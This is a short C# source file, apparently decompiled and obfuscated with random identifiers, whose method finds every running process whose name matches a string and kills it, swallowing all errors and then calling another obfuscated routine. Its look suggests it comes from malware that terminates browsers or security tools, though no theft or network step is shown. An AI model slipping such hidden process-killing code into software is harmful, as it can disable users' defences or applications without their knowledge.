using System;
using System.Diagnostics;

namespace OeQGwjtftIBDg;

public sealed class hzQgXFHgIEDDkq
{
	public static bool LRnhtDhpthBes(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void WFhhDsKceQishwl(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (LRnhtDhpthBes(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					jSdbwwLMlbK.VhbbmAnvAWgpo();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
